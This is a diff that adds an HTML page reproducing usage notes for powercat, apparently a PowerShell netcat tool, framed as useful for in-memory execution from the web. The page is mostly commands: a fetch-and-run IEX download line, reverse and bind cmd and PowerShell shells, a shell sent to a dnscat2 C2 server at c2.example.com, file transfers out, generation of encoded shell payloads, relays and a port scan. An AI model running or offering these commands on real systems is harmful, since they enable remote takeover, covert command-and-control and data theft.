@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PowerCat</title>
+</head><body>Netcat in Powershell<br/>
+Useful with powershell exec from web into memory execution<br/>
+<br/>
+https://github.com/besimorhino/powercat<br/>
+<br/>
+powercat<br/>
+<br/>
+Netcat: The powershell version. (Powershell Version 2 and Later Supported)<br/>
+Installation<br/>
+<br/>
+powercat is a powershell function. First you need to load the function before you can execute it. You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.<br/>
+<br/>
+Load The Function From Downloaded .ps1 File:<br/>
+&nbsp; &nbsp; . .\powercat.ps1<br/>
+Load The Function From URL:<br/>
+&nbsp; &nbsp; IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')<br/>
+<br/>
+Parameters:<br/>
+<br/>
+-l &nbsp; &nbsp; &nbsp;Listen for a connection. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
+-c &nbsp; &nbsp; &nbsp;Connect to a listener. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
+-p &nbsp; &nbsp; &nbsp;The port to connect to, or listen on. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[String]<br/>
+-e &nbsp; &nbsp; &nbsp;Execute. (GAPING_SECURITY_HOLE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[String]<br/>
+-ep &nbsp; &nbsp; Execute Powershell. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Switch]<br/>
+-r &nbsp; &nbsp; &nbsp;Relay. Format: "-r tcp:10.1.1.1:443" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
+-u &nbsp; &nbsp; &nbsp;Transfer data over UDP. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Switch]<br/>
+-dns &nbsp; &nbsp;Transfer data over dns (dnscat2). &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[String]<br/>
+-dnsft &nbsp;DNS Failure Threshold. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [int32]<br/>
+-t &nbsp; &nbsp; &nbsp;Timeout option. Default: 60 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[int32]<br/>
+-i &nbsp; &nbsp; &nbsp;Input: Filepath (string), byte array, or string. &nbsp; &nbsp; [object]<br/>
+-o &nbsp; &nbsp; &nbsp;Console Output Type: "Host", "Bytes", or "String" &nbsp; &nbsp;[String]<br/>
+-of &nbsp; &nbsp; Output File Path. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[String]<br/>
+-d &nbsp; &nbsp; &nbsp;Disconnect after connecting. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
+-rep &nbsp; &nbsp;Repeater. Restart after disconnecting. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
+-g &nbsp; &nbsp; &nbsp;Generate Payload. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Switch]<br/>
+-ge &nbsp; &nbsp; Generate Encoded Payload. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Switch]<br/>
+-h &nbsp; &nbsp; &nbsp;Print the help message. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Switch]<br/>
+<br/>
+Basic Connections<br/>
+<br/>
+By default, powercat reads input from the console and writes input to the console using write-host. You can change the output type to 'Bytes', or 'String' with -o.<br/>
+<br/>
+Basic Client:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 443<br/>
+Basic Listener:<br/>
+&nbsp; &nbsp; powercat -l -p 8000<br/>
+Basic Client, Output as Bytes:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 443 -o Bytes<br/>
+<br/>
+File Transfer<br/>
+<br/>
+powercat can be used to transfer files back and forth using -i (Input) and -of (Output File).<br/>
+<br/>
+Send File:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 443 -i C:\inputfile<br/>
+Recieve File:<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -of C:\inputfile<br/>
+<br/>
+Shells<br/>
+<br/>
+powercat can be used to send and serve shells. Specify an executable to -e, or use -ep to execute powershell.<br/>
+<br/>
+Serve a cmd Shell:<br/>
+&nbsp; &nbsp; powercat -l -p 443 -e cmd<br/>
+Send a cmd Shell:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 443 -e cmd<br/>
+Serve a shell which executes powershell commands:<br/>
+&nbsp; &nbsp; powercat -l -p 443 -ep<br/>
+<br/>
+DNS and UDP<br/>
+<br/>
+powercat supports more than sending data over TCP. Specify -u to enable UDP Mode. Data can also be sent to a dnscat2 server with -dns. Make sure to add "-e open --no-cache" when running the dnscat2 server.<br/>
+<br/>
+Send Data Over UDP:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 8000 -u<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -u<br/>
+Connect to the c2.example.com dnscat2 server using the DNS server on 10.1.1.1:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 53 -dns c2.example.com<br/>
+Send a shell to the c2.example.com dnscat2 server using the default DNS server in Windows:<br/>
+&nbsp; &nbsp; powercat -dns c2.example.com -e cmd<br/>
+<br/>
+Relays<br/>
+<br/>
+Relays in powercat work just like traditional netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.<br/>
+<br/>
+TCP Listener to TCP Client Relay:<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -r tcp:10.1.1.16:443<br/>
+TCP Listener to UDP Client Relay:<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -r udp:10.1.1.16:53<br/>
+TCP Listener to DNS Client Relay<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com<br/>
+TCP Listener to DNS Client Relay using the Windows Default DNS Server<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -r dns:::c2.example.com<br/>
+TCP Client to Client Relay<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.1 -p 9000 -r tcp:10.1.1.16:443<br/>
+TCP Listener to Listener Relay<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -r tcp:9000<br/>
+<br/>
+Generate Payloads<br/>
+<br/>
+Payloads which do a specific action can be generated using -g (Generate Payload) and -ge (Generate Encoded Payload). Encoded payloads can be executed with powershell -E. You can use these if you don't want to use all of powercat.<br/>
+<br/>
+Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:<br/>
+&nbsp; &nbsp; powercat -c 10.1.1.15 -p 443 -e cmd -g<br/>
+Generate a bind tcp encoded command which listens on port 8000:<br/>
+&nbsp; &nbsp; powercat -l -p 8000 -e cmd -ge<br/>
+<br/>
+Misc Usage<br/>
+<br/>
+powercat can also be used to perform portscans, and start persistent servers.<br/>
+<br/>
+Basic TCP Port Scanner:<br/>
+&nbsp; &nbsp; (21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}<br/>
+Start A Persistent Server That Serves a File:<br/>
+&nbsp; &nbsp; powercat -l -p 443 -i C:\inputfile -rep<br/>
+</body></html>
